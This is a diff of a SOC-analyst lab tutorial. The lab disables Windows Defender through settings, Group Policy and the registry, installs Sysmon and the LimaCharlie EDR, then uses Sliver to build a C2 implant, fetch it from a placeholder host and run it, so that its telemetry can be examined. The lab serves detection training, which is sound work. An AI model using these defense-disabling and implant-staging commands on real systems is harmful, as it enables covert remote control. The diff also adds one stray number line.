@@ -104,26 +104,26 @@
         2. Make sure DNS and outbound pings are working: <br/>
             `$ ping 8.8.8.8`
         3. If you got response, you’re good to go.
-
+7833012
 ## Step 2: Disable Defender on Windows VM
 1. **Disable Tamper Protection:**
     1. Click the **Start** menu icon.
     2. Click **Settings**.
-    3. Click **Privacy & security** on the left.
+    3. Click **Privacy & security** on the left menu.
     4. Click **Windows Security**.
     5. Click **Virus & threat protection**.
     6. Under **Virus & threat protection settings** click **Manage settings**.
-    7. Toggle OFF the **Tamper Protection** switch. When prompted, click **Yes**.
-    8. While you’re in there, **toggle every other option OFF as well**, even though we’re about to take care of it a couple different ways.
-    9. Close the windows we just opened.
+    7. Toggle **Off** the **Tamper Protection** switch. When prompted, click **Yes**.
+    8. Toggle **Off** the **other options** as well.
+    9. Close the window.
 2. **Permanently Disable Defender via Group Policy Editor:**
     1. Click the **Start** menu icon.
     2. Type **cmd** into the search bar within the **Start Menu**.
-    3. Right+Click **Command Prompt** and click **Run as administrator**.
+    3. Click **Run as administrator** under **Command Prompt**
         1. Run the following command: <br/>
-            `\> gpedit.msc`
+            `C:\Windows\System32> gpedit.msc`
     4. Inside the **Local Group Policy Editor.**
-        1. Click **Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus**
+        1. Click **Computer Configuration** > **Administrative Templates** > **Windows Components** > **Microsoft Defender Antivirus**.
         2. Double-click **Turn off Microsoft Defender Antivirus**.
         3. Select **Enabled**.
             - If you enable this policy setting, **Microsoft Defender Antivirus** does not run, and will not scan computers for malware or other potentially unwanted software.
@@ -132,16 +132,16 @@
 3. **Permanently Disable Defender via Registry.**
     1. From the same **administrative command prompt** we previously opened, copy/paste this command and press Enter:
         ```
-        \> REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+        C:\Windows\System32> REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
         ```
     2. While you’re still in the **administrative command prompt**, let’s also **prevent the VM from going into sleep/standby mode** during our tests:
         ```
-        \> powercfg /change standby-timeout-ac 0
-        \> powercfg /change standby-timeout-dc 0
-        \> powercfg /change monitor-timeout-ac 0
-        \> powercfg /change monitor-timeout-dc 0
-        \> powercfg /change hibernate-timeout-ac 0
-        \> powercfg /change hibernate-timeout-dc 0
+        C:\Windows\System32> powercfg /change standby-timeout-ac 0
+        C:\Windows\System32> powercfg /change standby-timeout-dc 0
+        C:\Windows\System32> powercfg /change monitor-timeout-ac 0
+        C:\Windows\System32> powercfg /change monitor-timeout-dc 0
+        C:\Windows\System32> powercfg /change hibernate-timeout-ac 0
+        C:\Windows\System32> powercfg /change hibernate-timeout-dc 0
         ```
 4. **Prepare to boot into Safe Mode to disable all Defender services**:
     1. Click the **Start** menu icon.
@@ -169,33 +169,30 @@
     4. **System will restart** into normal desktop environment, now (hopefully) **Defender-free**.
 
 ## Step 3: Install Sysmon in Windows VM
-1. Launch an **Administrative PowerShell console** for the following commands:
-    1. Click the **Start** menu icon.
-    2. Type **powershell** into the search bar within the **Start Menu**.
-    3. Right+Click **Windows PowerShell** and click **Run as administrator**
-2. Download **Sysmon** with the following command. Read more about **Sysmon** here (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon):
+1. Launch an **Administrative PowerShell console** by typing **powershell** into the search box, then click **Run as administrator** under **Windows PowerShell**.
+2. Download **Sysmon** with the following command. Read more about **Sysmon** [here](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon):
 ```
-PS \> Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
+PS C:\Windows\system32> Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
 ```
 3. Unzip **Sysmon.zip**:
 ```
-PS \> Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
+PS C:\Windows\system32> Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
 ```
 4. Download **SwiftOnSecurity’s** (https://infosec.exchange/@SwiftOnSecurity) **Sysmon config**:
 ```
-PS \> Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
+PS C:\Windows\system32> Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
 ```
 5. Install **Sysmon** with **Swift’s config**:
 ```
-PS \> C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
+PS C:\Windows\system32> C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
 ```
 6. Validate **Sysmon64 service** is installed and running:
 ```
-PS \> Get-Service sysmon64
+PS C:\Windows\system32> Get-Service sysmon64
 ```
 7. Check for the presence of **Sysmon Event Logs**:
 ```
-PS \> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
+PS C:\Windows\system32> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
 ```
 
 ## Step 4: Install LimaCharlie EDR on Windows VM
@@ -207,22 +204,22 @@ PS \> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
     4. **Template:** Extended Detection & Response Standard
 3. Once the organization is created, click **Add Sensor**:
     1. Select **Windows**.
-    2. Provide a description such as: **Windows VM - Lab**
+    2. Provide a description such as: **Win11-Target VM**
     3. Click **Create**.
     4. Select the **Installation Key** we just created.
     5. Specify the **x86-64 (.exe)** sensor, but don't follow the instructions provided.
     6. In the **Windows VM**, open an **Administrative PowerShell console** and paste the following commands:
     ```
-    PS \> cd C:\Users\User\Downloads
-    PS \> Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
+    PS C:\Windows\system32> cd C:\Users\user\Downloads
+    PS C:\Windows\system32> Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
     ```
     7. Shift into a **standard command prompt** by running this command:
     ```
-    PS \> cmd.exe
+    PS C:\Windows\system32> cmd.exe
     ```
     8. Next, we will copy the **install command provided by LimaCharlie on step 4 which contains the installation key**. Paste this command into your open terminal:
     ```
-    \> lc_sensor.exe -i <key>
+    C:\Windows\system32> lc_sensor.exe -i <key>
     ```
     9. Ignore the **ERROR** that says **service installed!**
         1. If you experience an error trying to install the (.exe), try the
@@ -236,8 +233,8 @@ PS \> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
         3. **Path Pattern:** wel://Microsoft-Windows-Sysmon/Operational:*
         4. **Retention Period:** 10
         5. Click **Save Rule**.
-    3. **LimaCharlie** will now start shipping **Sysmon logs** which provide a wealth of **EDR-like telemetry**, some of which is redundant to **LC’s own telemetry**, but **Sysmon** is still a very power visibility tool that runs well alongside any **EDR agent**.
-        1. The other reason we are ingesting **Sysmon logs** is that the built-in **Sigma rules** we previously enabled largely depend on **Sysmon logs** as that is what most of them were written for.
+    3. **LimaCharlie** will now start shipping **Sysmon logs** which provide a wealth of **EDR-like telemetry**, some of which is redundant to **LimaCharlie’s own telemetry**, but **Sysmon** is still a very powerful visibility tool that runs well alongside any **EDR agent**.
+        1. The other reason we are ingesting **Sysmon logs** is that the built-in **Sigma rules** largely depend on **Sysmon logs**.
 5. That’s all we’ll do with **LimaCharlie** for now. Feel free to close all open windows on the **Windows VM**.
     1. Now would be a good time to **Snapshot** your **Windows VM**.
 
@@ -277,7 +274,7 @@ $ sudo su
 6. Run the following commands to download **Sliver**, a **Command & Control (C2) framework by BishopFox**. I recommend copy/pasting the entire block as there is line-wrapping occurring:
 ```
 # Download Sliver Linux server binary
-$ wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
+$ wget https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux -O /usr/local/bin/sliver-server
 # Make it executable
 $ chmod +x /usr/local/bin/sliver-server
 # install mingw-w64 for additional capabilities
@@ -289,7 +286,7 @@ $ apt install -y mingw-w64
 $ mkdir -p /opt/sliver
 ```
 
-## Step 6: Generate our C2 payload
+## Step 6: Generate the Command and Control (C2) payload
 1. Drop into a **root shell**:
 ```
 $ sudo su
@@ -315,16 +312,16 @@ $ sliver-server
 $ cd /opt/sliver
 $ python3 -m http.server 80
 ```
-7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**. Now run the following command to **download your C2 payload from the Linux VM to the Windows VM**, swapping your own Linux VM IP [Linux_VM_IP] and the name of the payload we generated in Sliver [payload_name] a few steps prior:
+7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**. Now run the following command to **download your C2 payload from the Linux VM to the Windows VM**, swapping your own Linux VM IP [Host_IP] and the name of the payload we generated in Sliver [payload_name] a few steps prior:
 ```
-PS\> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+PS\> IWR -Uri http://[Host_IP]/[payload_name].exe -Outfile C:\Users\user\Downloads\[payload_name].exe
 ```
 8. Now would be a good time to **Snapshot** your **Windows VM**, before we execute the malware.
     1. Snapshot name: **Malware staged**
 
-## Step 7: Start Command and Control Session
-1. Now that the payload is on the Windows VM, we must switch back to the **Linux VM SSH session** and enable the **Sliver HTTP server** to catch the callback:
-    1. First, **terminate the python web server** we started by pressing Ctrl + C.
+## Step 7: Start Command and Control (C2) Session
+1. Now that the payload is on the Windows VM, we must switch back to the **Host session** and enable the **Sliver HTTP server** to catch the callback:
+    1. First, **terminate the python web server** we started by pressing Ctrl+C.
     2. Now, relaunch **Sliver as root**:
     ```
     $ sliver-server
@@ -333,10 +330,10 @@ PS\> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Dow
     ```
     [server] sliver > http
     ```
-    4. If you get an **error starting the HTTP listener**, try rebooting the Linux VM and retrying.
+    4. If you get an **error starting the HTTP listener**, try rebooting the Host and retrying.
 2. Return to the **Windows VM** and **execute the C2 payload** from its download location using the same **administrative PowerShell prompt** we had from before:
 ```
-PS\> C:\Users\User\Downloads\[your_C2-implant].exe
+PS\> C:\Users\user\Downloads\[your_C2-implant].exe
 ```
 3. Within a few moments, you should see your **session in the Sliver server**.
 4. Type **sessions** on the **Sliver shell** and take note of the **Session ID**:
@@ -374,27 +371,26 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
     ```
     - Notice that **Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red**.
 
-## Step 8: Observe EDR Telemetry So Far
-1. Let’s hop into the **LimaCharlie web UI** (https://app.limacharlie.io/) and check out some basic features:
+## Step 8: Explore EDR Telemetry Generate So Far
+1. Let’s hop into the **LimaCharlie web UI** (https://app.limacharlie.io) and check out some basic features:
     1. Click **Sensors** on left menu.
     2. Click your **active Windows sensor**.
     3. On the new left-side menu for this sensor, click **Processes**:
-        1. Spend a few minutes exploring what is returned in the **process tree**. Hover over some of the icons to see what they represent.
-            1. Get familiar with the most common processes you’ll encounter on even a healthy system. For some helpful resources in **knowing normal**, check out the **Hunt Evil** (https://www.sans.org/posters/hunt-evil/) poster from SANS and sign up for a free account at EchoTrail (https://www.echotrail.io/).
-        2. A process carrying a valid signature (Signed) is often (almost always) going to be benign itself. However, even legitimate signed processes can be used to launch malicious processes/code (read up on LOLBINs (https://lolbas-project.github.io/#)).
+        1. Explore what is returned in the **process tree**. Hover over some of the icons to see what they represent.
+            1. Get familiar with the most common processes you’ll encounter on even a healthy system. For some helpful resources in **knowing normal**, check out the **Hunt Evil** (https://www.sans.org/posters/hunt-evil) poster from SANS.
+        2. A process carrying a valid signature (Signed) is often (almost always) going to be benign itself. However, even legitimate signed processes can be used to launch malicious processes/code (read up on LOLBINs (https://lolbas-project.github.io)).
         3. One of the easiest ways to **spot unusual processes** is to simply look for ones that are **NOT signed**.
-        4. In my example, my **C2 implant** shows as not signed, and is also **active on the network**.
-        5. Notice how quickly we are able to **identify the destination IP** this process is communicating with.
+        4. In this example, the **C2 implant** shows as not signed, and is also **active on the network**.
+        5. Click on **View Network Connections** to identify the **destination IP** this process is communicating with.
     4. Now click the **Network** tab on the left-side menu.
-        1. Spend a few minutes exploring what is returned in the **network list**. Try using **Ctrl+F to search** for your **implant name** and/or **C2 IP address**.
+        1. Have a look on what is returned in the **network list**. Try using **Ctrl+F to search** for your **implant name**.
     5. Now click the **File System** tab on the left-side menu:
-        1. Browse to the **location** we know our **implant** to be **running** from:
-            1. `C:\Users\User\Downloads`
-        1. Inspect the **hash** of the **suspicious executable** by **scanning it with VirusTotal**.
-        3. Pro Tip: While it says **Scan with VirusTotal**, what it’s actually doing is querying **VirusTotal** for the **hash** of the **EXE**. If the file is a **common/well-known malware sample**, you will know it right away. However, **Item not found** on **VT** does not mean that this file is innocent, just that it’s never been seen before by **VirusTotal**. This makes sense because we just generated this **payload** ourselves, so of course it’s not likely to be seen by **VirusTotal** before. This is an important lesson for any analyst to learn — if you already suspect a file to be possible **malware**, but **VirusTotal** has never seen it before, trust your gut. This actually makes a file even more suspicious because nearly everything has been seen by **VirusTotal**, so your sample may have been **custom-crafted/targeted** which ups the ante a bit. In a mature **SOC**, this would likely affect the **TLP** of the **IOC** and/or case itself.
+        1. Browse to `C:\Users\User\Downloads`, the location where the **implant** is **running** from.
+        2. Click on **Inspect File Hash** on the implant file, then click on **Search hash on VirusTotal**.
+        3. **VirusTotal** will return **Item not found** because we just created the **implant** and its **hash** is not on **VirusTotal database**.
     6. Click **Timeline** on the left-side menu of our sensor. This is a **near real-time view of EDR telemetry + event logs streaming** from this system:
         1. Read about the various **EDR events** in the **LimaCharlie docs** (https://doc.limacharlie.io/docs/documentation/5e1d6b66e38e0-windows-sensor#supported-events).
-        2. Practice filtering your timeline with **known IOCs** (indicators of compromise) such as the **name of your implant** or the known **C2 IP address**:
+        2. Practice filtering your timeline with **known IOCs** (indicators of compromise) such as the **implant' name**, **implant's hash**, or the known **C2 IP address**:
             1. If you **scroll back** far enough, should be able to find the **moment your implant was created on the system**, and **when it was launched shortly after**, and the **network connections it created immediately after**.
             2. Examine the other events related to your implant process, you’ll see it is responsible for other events such as **SENSITIVE_PROCESS_ACCESS** from when we enumerated our privileges in an earlier step. This particular event will be useful later on when we craft our first detection rule.
 
